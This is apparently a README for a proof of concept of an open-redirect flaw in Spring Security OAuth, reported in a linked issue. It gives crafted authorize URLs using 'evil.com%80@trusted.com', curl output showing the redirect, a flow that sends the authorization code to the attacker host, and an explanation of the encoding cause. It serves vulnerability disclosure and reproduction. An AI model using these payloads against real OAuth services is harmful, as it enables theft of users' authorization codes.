# oauth2-open-redirect-sample

POC around https://github.com/spring-projects/spring-security-oauth/issues/1566

## 1) start app

```
./gradlew bootRun

```

## 2a) POC - Redirect without login (response type unknown)

open the following url in your browser / curl

    http://localhost:8080/oauth/authorize?client_id=clientId&redirect_uri=http://evil.com%80@trusted.com&response_type=bogus

-> RESULT: `302 Redirect` to `evil.com` which can be seen in the curl output (see `Location` response header):

```
$ curl -v "http://localhost:8080/oauth/authorize?client_id=clientId&redirect_uri=http://evil.com%80@trusted.com&response_type=bogus"
  *   Trying ::1...
  * TCP_NODELAY set
  * Connected to localhost (::1) port 8080 (#0)
  > GET /oauth/authorize?client_id=clientId&redirect_uri=http://evil.com%80@trusted.com&response_type=bogus HTTP/1.1
  > Host: localhost:8080
  > User-Agent: curl/7.54.0
  > Accept: */*
  >
  < HTTP/1.1 302
  < Location: http://evil.com?@trusted.com?error=unsupported_response_type&error_description=Unsupported%20response%20types:%20%5Bbogus%5D
  < Content-Language: en-US
  < Content-Length: 0
  < Date: Fri, 25 Jan 2019 05:10:00 GMT
  <
  * Connection #0 to host localhost left intact
```

## 2b) POC - Redirect with authorization code


1) open the following url in your browser

    http://localhost:8080/oauth/authorize?client_id=clientId&redirect_uri=http://evil.com%80@trusted.com&grant_type=authorization_code&response_type=code
    
2) Login with 'user' / 'password'

3) Observe 302 redirect with authorization code to attacker website, e.g. 

    http://evil.com/?@trusted.com?code=HSJwVn

## Explanation:

Tomcat 8 defaults to `UTF-8` to decode request params. `%80` can't be decoded as it's an invalid `UTF-8` hence it gets replaced by `� `. This character isn't a valid in `ISO 8859-1` which is used to serialize headers. This character gets replaced with `?` which leads to open redirect whenever oauth2 redirects back to the resource service (in both _success_ or _error_ cases!!!).
